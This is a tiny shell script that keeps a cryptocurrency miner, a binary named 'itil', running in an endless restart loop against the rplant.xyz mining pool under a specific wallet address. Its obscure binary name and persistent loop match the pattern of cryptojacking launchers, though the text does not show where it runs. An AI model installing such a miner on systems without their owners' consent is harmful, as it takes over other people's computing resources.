#!/bin/sh
#
while [ 1 ]; do
./itil -a gr -o stratum+tcps://stratum-eu.rplant.xyz:17056 -u RF6BqdgsKVS2D3qQfU1uBD48foYPrWLkJv.gas
sleep 5
done
